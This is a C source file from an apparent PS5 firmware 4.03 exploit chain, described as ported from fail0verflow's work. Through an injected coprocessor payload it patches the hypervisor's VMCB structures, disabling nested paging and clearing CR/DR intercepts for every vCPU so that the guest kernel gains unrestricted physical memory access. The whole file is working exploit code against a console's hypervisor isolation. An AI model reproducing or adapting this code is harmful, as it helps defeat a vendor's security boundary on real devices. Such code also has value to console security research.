/*
 * VMCB (Virtual Machine Control Block) patching via MP4 (A53) coprocessor.
 *
 * Ported from fail0verflow's prosperous exploit for PS5 FW 4.03.
 *
 * The PS5 hypervisor uses AMD SVM with nested paging to isolate
 * guest memory. The VMCB controls VM execution:
 *   - Instruction intercepts (offset 0x00-0x14)
 *   - Nested paging control (offset 0x90)
 *
 * Disabling NP and clearing intercepts gives the kernel direct
 * access to all physical memory without HV mediation.
 *
 * The x86 CPU cannot access VMCB physical addresses because the
 * HV's nested page tables (NPT) don't map them for the guest.
 * DMAP access causes #NPF -> instant kernel panic.
 *
 * After TMR bypass (which removes data fabric protections on HV memory),
 * the MP4/A53 coprocessor can read/write arbitrary system physical
 * addresses via SysHub TLB entries. The A53 runs at EL3 and bypasses
 * x86 NPT entirely.
 *
 * We use the injected MP4 payload to read/write VMCB data through
 * the c2p mailbox register interface.
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/* Number of vCPU contexts to patch */
#define MAX_VCPUS   16

/* vCPU context structure stride and VMCB pointer offset */
#define VCPU_CTX_SIZE       0x320
#define VCPU_CTX_VMCB_OFF   0x08

/* ================================================================
 * VMCB patching via MP4 payload
 * ================================================================ */

int vmcb_patch_disable_np(struct phys_rw_ctx *ctx)
{
    uint64_t vcpu_ctxs_pa = VCPU_CTXS_PA;
    int patched = 0;

    printf("[VMCB] === MP4 VMCB Patching ===\n");
    printf("[VMCB] VCPU contexts at system PA 0x%llx\n",
           (unsigned long long)vcpu_ctxs_pa);

    /* Verify MP4 payload is alive */
    if (mp4_ping(ctx) != 0) {
        printf("[!] VMCB: MP4 payload not responding\n");
        return -1;
    }
    printf("[+] MP4 payload alive\n");

    /* Read HV VA base from system PA 0x62848000.
     * First qword = HV virtual address base used for VA<->PA conversion. */
    printf("[VMCB] Reading HV VA base from PA 0x62848000...\n");
    uint64_t hv_va_base = mp4_read64(ctx, 0x62848000ULL);
    printf("[VMCB] HV VA base: 0x%llx\n", (unsigned long long)hv_va_base);

    if (hv_va_base == 0 || hv_va_base == 0xFFFFFFFFFFFFFFFFULL) {
        printf("[!] VMCB: Invalid HV VA base — TMR not bypassed?\n");
        return -1;
    }

    /* Patch each vCPU's VMCB */
    for (int i = 0; i < MAX_VCPUS; i++) {
        uint64_t ctx_pa = vcpu_ctxs_pa + VCPU_CTX_SIZE * i + VCPU_CTX_VMCB_OFF;

        /* Read VMCB virtual address from vCPU context */
        uint64_t vmcb_va = mp4_read64(ctx, ctx_pa);
        if (vmcb_va == 0) continue;

        /* Convert HV VA to system PA */
        uint64_t vmcb_pa = vmcb_va - hv_va_base;

        /* Read NP_CTRL (offset 0x90 in VMCB) */
        uint64_t np_ctrl = mp4_read64(ctx, vmcb_pa + VMCB_NP_CTRL);

        /* If already zero, VMCBs were previously modified */
        if (np_ctrl == 0) break;

        /* Sanity check: NP_CTRL should have NP_ENABLE set */
        if (!(np_ctrl & NP_ENABLE)) {
            printf("[VMCB] vCPU %d: NP already disabled (0x%llx)\n",
                   i, (unsigned long long)np_ctrl);
            continue;
        }

        /* Read vec3 to preserve CPUID intercept */
        uint32_t vec3 = mp4_read32(ctx, vmcb_pa + VMCB_INTERCEPT_VEC3);
        uint32_t cpuid_intercept = vec3 & (1 << 18);

        /* Patch: disable nested paging */
        mp4_write64(ctx, vmcb_pa + VMCB_NP_CTRL, 0);

        /* Patch intercepts:
         *   vec0: Clear all CR/DR intercepts
         *   vec3: Keep only CPUID intercept
         *   vec4: Keep VMSAVE/VMLOAD/VMMCALL/VMRUN (0x0F) */
        mp4_write32(ctx, vmcb_pa + VMCB_INTERCEPT_VEC0, 0);
        mp4_write32(ctx, vmcb_pa + VMCB_INTERCEPT_VEC3, cpuid_intercept);
        mp4_write32(ctx, vmcb_pa + VMCB_INTERCEPT_VEC4, 0x0F);

        patched++;
        printf("[VMCB] Patched vCPU %d: sysPA=0x%llx NP 0x%llx->0\n",
               i, (unsigned long long)vmcb_pa, (unsigned long long)np_ctrl);
    }

    printf("[VMCB] Patched %d VMCBs via MP4 coprocessor\n", patched);
    return (patched > 0) ? 0 : -1;
}
